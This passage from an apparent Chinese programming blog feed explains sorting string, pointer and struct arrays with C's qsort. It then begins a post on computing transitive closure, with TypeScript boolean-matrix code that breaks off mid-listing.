punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">char</span> str1<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token string">"iosd"</span><span class="token punctuation">,</span> <span class="token string">"adw"</span><span class="token punctuation">,</span> <span class="token string">"werws"</span><span class="token punctuation">,</span> <span class="token string">"sdf"</span><span class="token punctuation">,</span> <span class="token string">"abc"</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>  <span class="token comment">//正统字符串数组</span>    <span class="token function">qsort</span><span class="token punctuation">(</span>str1<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>str1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>str1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> cmp1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//①</span>    <span class="token keyword">char</span> <span class="token operator">*</span>str2<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token string">"iosd"</span><span class="token punctuation">,</span> <span class="token string">"adw"</span><span class="token punctuation">,</span> <span class="token string">"werws"</span><span class="token punctuation">,</span> <span class="token string">"sdf"</span><span class="token punctuation">,</span> <span class="token string">"abc"</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>  <span class="token comment">//字符串指针数组</span>    <span class="token function">qsort</span><span class="token punctuation">(</span>str2<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>str2<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>str2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span> cmp2<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//②</span>    <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>str3 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">calloc</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//动态开辟的用于存放字符串的二维指针</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        str3<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">calloc</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">strcpy</span><span class="token punctuation">(</span>str3<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"iosd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">strcpy</span><span class="token punctuation">(</span>str3<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"adw"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">strcpy</span><span class="token punctuation">(</span>str3<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"werws"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">strcpy</span><span class="token punctuation">(</span>str3<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"sdf"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">strcpy</span><span class="token punctuation">(</span>str3<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"abc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">qsort</span><span class="token punctuation">(</span>str3<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span> cmp2<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//③</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>①str1最普通的字符串数组，可以看做多维字符数组，qsort各参数写法与二维整数数组相同②str2为字符串指针数组，即存放指向字符串的指针的数组，第二个参数中sizeof(str2)表示数组大小，大小不是所有字符串字符个数之和，而是元素个数4，因为其存放的是指针，大小为固定的4，因此sizeof(str2[i]])(i=1,2,3,4)为固定值4，类比动态开辟内存的多维整数指针，传入cmp2的是一个类型为char**的二维地址③str3位动态开辟的用于存放字符串的二维指针，qsort写法与二维整数指针相同，同样可以使用cmp2</p><h2 id="数据结构数组">6. 数据结构数组</h2><p>结合一个自拟的题目来讲一下结构体数组的快排有什么作用吧 题目：给定一个字符串序列<code>{ "acd", "fsfe", "aae", "sw", "servb", "fsvbs", "wg" }</code>，对其进行排序，排序要求为：①根据字符串长度进行排序；②字符串长度相同时，根据字符串字符对应ASCII值进行排序</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">struct</span> <span class="token class-name">STR</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> len<span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>str<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">cmp</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>a<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>b<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment">//cmp的写法比较灵活，可以根据排序需要进行修改</span>    <span class="token keyword">struct</span> <span class="token class-name">STR</span> <span class="token operator">*</span>m <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">STR</span><span class="token operator">*</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span> <span class="token operator">*</span>n <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">STR</span><span class="token operator">*</span><span class="token punctuation">)</span>b<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>m<span class="token operator">-&gt;</span>len <span class="token operator">!=</span> n<span class="token operator">-&gt;</span>len<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> m<span class="token operator">-&gt;</span>len <span class="token operator">-</span> n<span class="token operator">-&gt;</span>len<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">strcmp</span><span class="token punctuation">(</span>m<span class="token operator">-&gt;</span>str<span class="token punctuation">,</span> n<span class="token operator">-&gt;</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">char</span> <span class="token operator">*</span>str<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token string">"acd"</span><span class="token punctuation">,</span> <span class="token string">"fsfe"</span><span class="token punctuation">,</span> <span class="token string">"aae"</span><span class="token punctuation">,</span> <span class="token string">"sw"</span><span class="token punctuation">,</span> <span class="token string">"servb"</span><span class="token punctuation">,</span> <span class="token string">"fsvbs"</span><span class="token punctuation">,</span> <span class="token string">"wg"</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>  <span class="token comment">//题目给定的字符串序列</span>    <span class="token keyword">struct</span> <span class="token class-name">STR</span> <span class="token operator">*</span>arr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">STR</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">calloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">STR</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">7</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment">//对结构体len和str进行赋值</span>        arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>len <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>str<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>str <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">calloc</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">strcpy</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>str<span class="token punctuation">,</span> str<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">qsort</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">STR</span><span class="token punctuation">)</span><span class="token punctuation">,</span> cmp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>用打印来看一下结果</p><p>这道题目本身其实在布建立结构体的情况下也可以做，建立结构体只是说明一种情况，在需要将不同的数据类型绑定在一起进行综合排序的时候，可以考虑先通过建立结构体进行绑定，再对结构体进行排序再附一道例题<a href="833.%20字符串中的查找与替换">https://leetcode-cn.com/problems/find-and-replace-in-string/</a>，这道题目如果先将三个不同类型的序列进行绑定，然后倒序排序，在替换的时候会方便很多</p><h2 id="总结">总结</h2><p>总的来说，多维数组qsort的写法主要分为两种（1）普通数组的定义方式，如<code>int arr[10][2]</code>、<code>char str[10][5]</code>的方式定义的二维数组或字符串数组<br><code>qsort(arr, NUM, sizeof(arr) / NUM, cmp);</code><br>此写法中NUM为二维数组或字符串数组的维度（10），由于是最普通的定义方式，因此<code>sizeof(数组名)</code>的结果为数组占用内存大小，因此单个元素大小为<code>sizeof(arr) / NUM</code>cmp第一行m、n赋值写法为</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">cmp</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>a<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>b<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> <span class="token operator">*</span>m <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span> <span class="token operator">*</span>n <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token punctuation">)</span>b<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（2）指针数组的定义方式，如<code>int **arr = (int**)calloc(...)</code>、<code>char *str[10]</code>的方式定义的指针数组<br><code>qsort(arr, NUM, sizeof(int*), cmp)</code>此写法中<code>NUM</code>为指针数组的维度（10），第三个参数为数组中单个指针的大小cmp第一行m、n赋值写法为</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">cmp</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>a<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>b<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> <span class="token operator">*</span>m <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span> <span class="token operator">*</span>n <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>b<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程 </tag>
            
            <tag> C </tag>
            
            <tag> 锐格 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Warshall算法求传递闭包</title>
      <link href="/2022/04/06/warshall-suan-fa-qiu-chuan-di-bi-bao/"/>
      <url>/2022/04/06/warshall-suan-fa-qiu-chuan-di-bi-bao/</url>
      
        <content type="html"><![CDATA[<h1 id="warshall-算法求传递闭包">Warshall 算法求传递闭包</h1><h2 id="传递闭包">传递闭包</h2><p>传递闭包、即在数学中，在集合 X 上的二元关系 R 的传递闭包是包含 R 的 X上的最小的传递关系。 例如，如果 X 是(生或死)人的集合而 R是关系“为父子”，则 R 的传递闭包是关系“x 是 y 的祖先”。再比如，如果 X是空港的集合而关系 xRy 为“从空港 x 到空港 y 有直航”，则 R的传递闭包是“可能经一次或多次航行从 x 飞到 y”。</p><p>设 R 是集合A上的关系。连通性关系 R*由形如(a,b)的有序对构成，使得在关系R中，从 a 到 b之间存在一条长度至少为1的路径</p><p>假设二元关系 R 代表了纽约所有地铁站之间的直接到达关系，如 (a,b),(b,c)代表可以从 a 直达b , 从 b 可以直达 c , 从a 也能间接到达 c。而连通性关系则包涵了 (a,b),(b,c),(a,c)这样的关系，可以认为是关系的深度挖掘，找出所有节点通过某个路径可到达的所有节点(一种多对多关系)。传递闭包和连通性关系可以被认为是等价的，一旦我们计算出了连通性关系R*也就求出了传递闭包。</p><p>关系R的连通性关系 R* = R ∪ R^2 ∪ R^3 ... ∪ R^n n =关系集合中的元素个数</p><p>至于延伸到矩阵中的运算这里不做展开。</p><h2 id="原始的计算方法">原始的计算方法</h2><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/** * @description 计算 A B 布尔矩阵的布尔积 * @param a 待计算的 A 矩阵 * @param b 待计算的 B 矩阵 * @return 返回结果矩阵 */</span>function <span class="token function">booleanMartixProduct</span><span class="token punctuation">(</span>a<span class="token operator">:</span> number<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> b<span class="token operator">:</span> number<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">:</span> number<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>  let aRow <span class="token operator">=</span> a<span class="token punctuation">.</span>length  let bCol <span class="token operator">=</span> b<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>length  <span class="token keyword">if</span> <span class="token punctuation">(</span>aRow <span class="token operator">!=</span><span class="token operator">=</span> bCol<span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"无法计算矩阵"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span>  <span class="token punctuation">}</span>  let res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span>let i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> aRow<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    res<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>let j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> bCol<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      res<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">booleanVectorProduct</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> b<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>v <span class="token operator">=</span><span class="token operator">&gt;</span> v<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> res<span class="token punctuation">}</span><span class="token comment">/** * @description 计算两个布尔向量的最终结果 如果a[i] = b[i] = 1 那么结果为1 否则为0 * @param {[number]} a 待计算的向量 A * @param {[number]} b 待计算的向量 B * @returns {number} 0 or 1  */</span>function <span class="token function">booleanVectorProduct</span><span class="token punctuation">(</span>a<span class="token operator">:</span> number<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> b<span class="token operator">:</span> number<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">:</span> number <span class="token punctuation">{</span>  <span class="token keyword">const</span> lenA <span class="token operator">=</span> a<span class="token punctuation">.</span>length  <span class="token keyword">const</span> lenB <span class="token operator">=</span> b<span class="token punctuation">.</span>length  <span class="token keyword">if</span> <span class="token punctuation">(</span>lenA <span class="token operator">!=</span><span class="token operator">=</span> lenB<span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"向量布尔积计算失败"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> null  <span class="token punctuation">}</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span>let i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> lenA<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span><span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> b<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span><span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">return</span> <span class="token number">1</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">}</span><span class="token comment">/** * @description 计算两个布尔矩阵的集合运算 传入高阶函数 * * @param {number[][]} a * @param {number[][]} b * @param {(a: number, b: number) =&gt; boolean} cb * @returns */</span>function <span class="token function">booleanMartixCalc</span><span class="token punctuation">(</span>a<span class="token operator">:</span> number<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> b<span class="token operator">:</span> number<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> cb<span class="token operator">:</span> <span class="token punctuation">(</span>a<span class="token operator">:</span> number<span class="token punctuation">,</span> b<span class="token operator">:</span> number<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">&gt;</span> boolean<span class="token punctuation">)</span> <span class="token punctuation">{</span>  let ai <span class="token operator">=</span> a<span class="token punctuation">.</span>length  let bi <span class="token operator">=</span> b<span class="token punctuation">.</span>length  let aj <span class="token operator">=</span> a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>length  let bj <span class="token operator">=</span> b<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>length  <span class="token keyword">if</span> <span class="token punctuation">(</span>ai <span class="token operator">!=</span><span class="token operator">=</span> bi <span class="token operator">||</span> aj <span class="token operator">!=</span><span class="token operator">=</span> bj<span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"无法计算"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  let res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span>let i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> ai<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    res<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>let j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> aj<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      res<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">Number</span><span class="token punctuation">(</span><span class="token function">cb</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> res<span class="token punctuation">}</span><span class="token comment">/** * @description 计算布尔矩阵的并 (Join) * @param a  * @param b  */</span>function <span class="token function">booleanMartixJoin</span><span class="token punctuation">(</span>a<span class="token operator">:</span> number<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> b<span class="token operator">:</span> number<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">:</span> number<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token function">booleanMartixCalc</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> <span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">&gt;</span> a <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">||</span> b <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token comment">/** * @description 计算布尔矩阵的交 (Meet) * @param a  * @param b  */</span>function <span class="token function">booleanMartixMeet</span><span class="token punctuation">(</span>a<span class="token operator">:</span> number<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> b<span class="token operator">:</span> number<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">:</span> number<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token function">booleanMartixCalc</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> <span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">&gt;</span> a <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> b <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token comment">/** * 计算一个n*n的矩阵的传递闭包 * 复杂度 O(n ^ 4) *  * @param m  */</span>function <span class="token function">calcTransitiveClosure</span><span class="token punctuation">(</span>m<span class="token operator">:</span> number<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">:</span> number<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>  let a <span class="token operator">=</span> m  let b <span class="token operator">=</span> a  let n <span class="token operator">=</span> m<span class="token punctuation">.</span>length  <span class="token keyword">for</span> <span class="token punctuation">(</span>let i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    a <span class="token operator">=</span> <span class="token function">booleanMartixProduct</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> m<span class="token punctuation">)</span> <span class="token comment">// 不断累加布尔积</span>    b <span class="token operator">=</span> <span class="token function">booleanMartixJoin</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span> <span class="token comment">// 做join运算</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> b<span class="token punctuation">}</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">calcTransitiveClosure</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" 